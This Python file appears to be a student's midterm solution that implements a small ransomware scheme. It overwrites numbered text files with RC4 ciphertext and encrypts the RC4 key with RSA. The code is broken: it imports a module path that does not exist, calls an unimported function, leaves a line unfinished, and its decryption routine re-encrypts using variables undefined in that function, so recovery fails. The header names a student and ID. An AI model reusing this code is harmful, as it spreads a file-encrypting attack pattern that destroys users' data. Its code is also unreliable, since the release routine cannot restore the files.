'''
Dhruv Chakraborty
UID: 204962098
Solution for Midterm Problem 2
'''

from Crypto.Cipher import ARC4
from Crypto import Random
from Crypto.Public_Key import RSA

filenames = ['1', '2', '3', '4', '5', '6', '7']

key_pair = RSA.generate(1024)
public_key = key_pair.publickey()

def ransomAttack(public_key, filenames):
	shared_key = get_random_bytes(64)
	encrypt_obj = ARC4.new(shared_key)

	for name in filenames:
		with open('{}.txt'.format(name), 'r') as reader:
			data = reader.read()
		with open('{}.txt'.format(name), 'w') as writer:
			writer.write(encrypt_obj.encrypt(data).encode('hex'))

	return public_key.encrypt(shared_key, None)

        
def recoverKey(key_pair,cypherkey):
    return key_pair.decrypt(cypherkey)    

def ransomRelease(shared_key, filenames):
	decrypt_obj = ARC4.new(shared_key)

	for file in filenames:
		with open('{}.txt'.format(file), 'r') as reader:
			ciphertext = reader.read().decode('hex')
		text = decrypt
		with open('{}.txt'.format(file), 'w') as writer:
			writer.write(encrypt_obj.encrypt(data).encode('hex'))






















	